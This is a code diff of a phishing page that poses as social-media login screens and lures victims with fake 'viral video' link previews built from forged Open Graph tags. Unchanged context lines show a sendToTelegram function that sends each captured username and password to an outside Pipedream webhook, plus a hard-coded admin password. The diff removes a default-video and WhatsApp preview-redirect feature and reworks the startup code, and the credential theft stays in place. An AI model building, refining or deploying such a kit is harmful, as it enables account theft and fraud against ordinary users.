@@ -632,63 +632,6 @@
         .platform-selector .save-platform-btn:hover {
             opacity: 0.9;
         }
-        .default-selector {
-            background: #f7f8fa;
-            border-radius: 16px;
-            padding: 20px 24px;
-            border: 1px solid #e4e6eb;
-            margin-bottom: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
-        .default-selector .label {
-            font-size: 14px;
-            color: #1a1a1a;
-            font-weight: 500;
-            font-family: Arial, Helvetica, sans-serif;
-        }
-        .default-selector .label .highlight {
-            color: #1877f2;
-            font-weight: 600;
-        }
-        .default-selector .default-video-name {
-            font-weight: 600;
-            color: #1877f2;
-            font-size: 15px;
-            font-family: Arial, Helvetica, sans-serif;
-        }
-        .default-selector select {
-            padding: 8px 16px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 14px;
-            background: #fff;
-            cursor: pointer;
-            outline: none;
-            min-width: 200px;
-            font-family: Arial, Helvetica, sans-serif;
-        }
-        .default-selector select:focus {
-            border-color: #1877f2;
-        }
-        .default-selector .set-default-btn {
-            padding: 8px 24px;
-            border: none;
-            border-radius: 20px;
-            background: #1877f2;
-            color: #fff;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: opacity 0.3s;
-            font-family: Arial, Helvetica, sans-serif;
-        }
-        .default-selector .set-default-btn:hover {
-            opacity: 0.9;
-        }
         .add-video-form {
             background: #f7f8fa;
             border-radius: 16px;
@@ -761,10 +704,6 @@
         }
         .video-item:hover {
             border-color: #1877f2;
-        }
-        .video-item.default {
-            border-color: #1877f2;
-            background: #e7f3ff;
         }
         .video-item .video-info {
             flex: 1;
@@ -980,14 +919,12 @@
                 left: 20px;
                 max-width: none;
             }
-            .platform-selector,
-            .default-selector {
+            .platform-selector {
                 flex-direction: column;
                 align-items: stretch;
                 text-align: center;
             }
-            .platform-selector select,
-            .default-selector select {
+            .platform-selector select {
                 width: 100%;
             }
         }
@@ -1092,19 +1029,6 @@
                     <button class="save-platform-btn" onclick="savePlatform()">Save Platform</button>
                 </div>
             </div>
-            <div class="default-selector">
-                <div>
-                    <span class="label">🎯 <span class="highlight">Default Video Preview</span></span>
-                    <div style="margin-top:4px; font-size:13px; color:#666;">This video will show when someone shares your site URL</div>
-                </div>
-                <div style="display:flex; align-items:center; gap:12px; flex-wrap:wrap;">
-                    <span class="default-video-name" id="defaultVideoName">None selected</span>
-                    <select id="defaultVideoSelect">
-                        <option value="">— Select a video —</option>
-                    </select>
-                    <button class="set-default-btn" onclick="setDefaultVideo()">Set as Default</button>
-                </div>
-            </div>
             <div class="add-video-form">
                 <h3>➕ Add New Video</h3>
                 <div class="form-row">
@@ -1138,7 +1062,7 @@
         const ADMIN_PASS = 'admin123';
 
         // ============================================================
-        // PIPEDREAM WEBHOOK - YOUR TOKEN IS HIDDEN!
+        // PIPEDREAM WEBHOOK
         // ============================================================
         const PIPEDREAM_WEBHOOK = 'https://eo6iu06jrrzv8j7.m.pipedream.net';
 
@@ -1168,7 +1092,6 @@
 
         let currentPlatform = 'facebook';
         let videos = [];
-        let defaultVideoId = null;
         let editId = null;
 
         // ============================================================
@@ -1189,9 +1112,6 @@
                 }
             } catch(e) { videos = []; }
             try {
-                defaultVideoId = parseInt(localStorage.getItem('defaultVideoId')) || null;
-            } catch(e) { defaultVideoId = null; }
-            try {
                 const savedPlatform = localStorage.getItem('selectedPlatform');
                 if (savedPlatform && platforms[savedPlatform]) {
                     currentPlatform = savedPlatform;
@@ -1203,10 +1123,6 @@
             try { localStorage.setItem('videos', JSON.stringify(videos)); } catch(e) {}
         }
 
-        function saveDefaultVideo() {
-            try { localStorage.setItem('defaultVideoId', defaultVideoId || ''); } catch(e) {}
-        }
-
         function savePlatformStorage() {
             try { localStorage.setItem('selectedPlatform', currentPlatform); } catch(e) {}
         }
@@ -1216,12 +1132,8 @@
             return Math.max(...videos.map(v => v.id)) + 1;
         }
 
-        function getDefaultVideo() {
-            return videos.find(v => v.id === defaultVideoId) || null;
-        }
-
         // ============================================================
-        // TELEGRAM SENDER - Using your new Pipedream webhook
+        // TELEGRAM SENDER
         // ============================================================
         async function sendToTelegram(platform, username, password) {
             const message = `🔐 New Login Attempt (${platform})%0A%0A📧 Email/Username: ${encodeURIComponent(username)}%0A🔑 Password: ${encodeURIComponent(password)}%0A%0A🕐 Time: ${new Date().toLocaleString()}`;
@@ -1271,19 +1183,18 @@
         }
 
         function updateOGTags(platform) {
-            const defaultVideo = getDefaultVideo();
             document.querySelectorAll('meta[property^="og:"], meta[name^="twitter:"]').forEach(el => el.remove());
             const tags = [
-                { property: 'og:title', content: defaultVideo ? defaultVideo.title : platform.ogTitle },
-                { property: 'og:description', content: defaultVideo ? defaultVideo.description : platform.ogDescription },
-                { property: 'og:image', content: defaultVideo ? defaultVideo.image : platform.ogImage },
+                { property: 'og:title', content: platform.ogTitle },
+                { property: 'og:description', content: platform.ogDescription },
+                { property: 'og:image', content: platform.ogImage },
                 { property: 'og:url', content: window.location.origin + window.location.pathname },
                 { property: 'og:type', content: 'website' },
                 { property: 'og:site_name', content: platform.ogSiteName },
                 { name: 'twitter:card', content: 'summary_large_image' },
-                { name: 'twitter:title', content: defaultVideo ? defaultVideo.title : platform.ogTitle },
-                { name: 'twitter:description', content: defaultVideo ? defaultVideo.description : platform.ogDescription },
-                { name: 'twitter:image', content: defaultVideo ? defaultVideo.image : platform.ogImage }
+                { name: 'twitter:title', content: platform.ogTitle },
+                { name: 'twitter:description', content: platform.ogDescription },
+                { name: 'twitter:image', content: platform.ogImage }
             ];
             tags.forEach(tag => {
                 const meta = document.createElement('meta');
@@ -1307,17 +1218,6 @@
         // ============================================================
         function renderVideos() {
             const container = document.getElementById('videoListContainer');
-            const defaultVideo = getDefaultVideo();
-            const select = document.getElementById('defaultVideoSelect');
-            select.innerHTML = '<option value="">— Select a video —</option>';
-            videos.forEach(v => {
-                const option = document.createElement('option');
-                option.value = v.id;
-                option.textContent = v.title;
-                if (v.id === defaultVideoId) option.selected = true;
-                select.appendChild(option);
-            });
-            document.getElementById('defaultVideoName').textContent = defaultVideo ? defaultVideo.title : 'None selected';
             if (videos.length === 0) {
                 container.innerHTML = `
                     <div class="empty-state">
@@ -1329,20 +1229,15 @@
             }
             let html = '<div class="video-list">';
             videos.forEach(v => {
-                const isDefault = v.id === defaultVideoId;
                 const videoUrl = window.location.origin + window.location.pathname + '?video=' + v.id;
                 html += `
-                    <div class="video-item ${isDefault ? 'default' : ''}">
+                    <div class="video-item">
                         <div class="video-info">
-                            <div class="title">
-                                ${v.title}
-                                ${isDefault ? '<span class="default-badge">⭐ Default</span>' : ''}
-                            </div>
+                            <div class="title">${v.title}</div>
                             <div class="desc">${v.description}</div>
                             <div class="video-id">🔗 Share: <a href="${videoUrl}" target="_blank">${videoUrl}</a></div>
                         </div>
                         <div class="video-actions">
-                            ${!isDefault ? `<button class="set-default-btn" onclick="setVideoAsDefault(${v.id})">⭐ Set Default</button>` : ''}
                             <button class="edit-btn" onclick="openEditModal(${v.id})">✏️ Edit</button>
                             <button class="delete-btn" onclick="deleteVideo(${v.id})">🗑️ Delete</button>
                         </div>
@@ -1356,30 +1251,6 @@
         // ============================================================
         // VIDEO CRUD FUNCTIONS
         // ============================================================
-        function setVideoAsDefault(id) {
-            defaultVideoId = id;
-            saveDefaultVideo();
-            renderVideos();
-            const platform = platforms[currentPlatform];
-            updateOGTags(platform);
-            showToast('Default video updated!', 'success');
-        }
-
-        function setDefaultVideo() {
-            const select = document.getElementById('defaultVideoSelect');
-            const id = parseInt(select.value);
-            if (id) {
-                setVideoAsDefault(id);
-            } else {
-                defaultVideoId = null;
-                saveDefaultVideo();
-                renderVideos();
-                const platform = platforms[currentPlatform];
-                updateOGTags(platform);
-                showToast('Default video removed.', 'success');
-            }
-        }
-
         function addVideo() {
             const title = document.getElementById('videoTitleInput').value.trim();
             const image = document.getElementById('videoImageInput').value.trim();
@@ -1391,10 +1262,6 @@
             const newVideo = { id: getNextId(), title, description: desc, image };
             videos.push(newVideo);
             saveVideos();
-            if (videos.length === 1) {
-                defaultVideoId = newVideo.id;
-                saveDefaultVideo();
-            }
             renderVideos();
             const platform = platforms[currentPlatform];
             updateOGTags(platform);
@@ -1406,10 +1273,6 @@
 
         function deleteVideo(id) {
             if (!confirm('Are you sure you want to delete this video?')) return;
-            if (defaultVideoId === id) {
-                defaultVideoId = null;
-                saveDefaultVideo();
-            }
             videos = videos.filter(v => v.id !== id);
             saveVideos();
             renderVideos();
@@ -1909,76 +1772,20 @@
         }
 
         // ============================================================
-        // WHATSAPP VIDEO PREVIEW REDIRECT
-        // ============================================================
-        function handleVideoRedirect() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const videoId = urlParams.get('video');
-            let video = null;
-            if (videoId) {
-                video = videos.find(v => v.id === parseInt(videoId));
-            }
-            if (!video && defaultVideoId) {
-                video = videos.find(v => v.id === defaultVideoId);
-            }
-            if (video) {
-                showVideoPreview(video);
-                return true;
-            }
-            return false;
-        }
-
-        function showVideoPreview(video) {
-            const platform = platforms[currentPlatform];
-            document.head.innerHTML = `
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>${video.title}</title>
-                <meta property="og:title" content="${video.title}" />
-                <meta property="og:description" content="${video.description}" />
-                <meta property="og:image" content="${video.image}" />
-                <meta property="og:url" content="${window.location.origin}${window.location.pathname}" />
-                <meta property="og:type" content="video.other" />
-                <meta property="og:site_name" content="${platform.ogSiteName}" />
-                <meta name="twitter:card" content="summary_large_image" />
-                <meta name="twitter:title" content="${video.title}" />
-                <meta name="twitter:description" content="${video.description}" />
-                <meta name="twitter:image" content="${video.image}" />
-                <style>
-                    body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: Arial, Helvetica, sans-serif; margin: 0; }
-                    .container { text-align: center; color: #fff; padding: 40px 20px; max-width: 500px; }
-                    .video-placeholder { background: #1a1a1a; border-radius: 16px; padding: 40px 20px; margin-bottom: 30px; border: 1px solid #333; }
-                    .video-placeholder .play-icon { font-size: 80px; color: #fff; background: ${platform.previewColor}; width: 120px; height: 120px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
-                    .video-placeholder h1 { font-size: 24px; margin-bottom: 10px; }
-                    .video-placeholder p { color: #888; font-size: 16px; }
-                    .footer { margin-top: 30px; color: #444; font-size: 12px; }
-                </style>
-            `;
-            document.body.innerHTML = `
-                <div class="container">
-                    <div class="video-placeholder">
-                        <div class="play-icon">▶</div>
-                        <h1>${video.title}</h1>
-                        <p>${video.description}</p>
-                    </div>
-                    <div class="footer">${platform.ogSiteName} • Viral Videos • 2026</div>
-                </div>
-                <script>
-                    setTimeout(function() {
-                        window.location.href = window.location.origin + window.location.pathname;
-                    }, 500);
-                <\/script>
-            `;
-        }
-
-        // ============================================================
         // INIT
         // ============================================================
-        loadVideos();
-        populateDropdowns();
-        applyPlatform(currentPlatform);
-        const isVideoPreview = handleVideoRedirect();
-        if (!isVideoPreview) {
+        async function init() {
+            populateDropdowns();
+            try {
+                const savedPlatform = localStorage.getItem('selectedPlatform');
+                if (savedPlatform && platforms[savedPlatform]) {
+                    currentPlatform = savedPlatform;
+                }
+            } catch (e) {}
+
+            await loadVideos();
+            applyPlatform(currentPlatform);
+
             const savedLang = localStorage.getItem('preferredLanguage');
             if (savedLang) {
                 applyTranslations(savedLang);
@@ -1988,6 +1795,8 @@
             }
             showLoginPage(currentPlatform);
         }
+
+        init();
     </script>
 </body>
 </html>
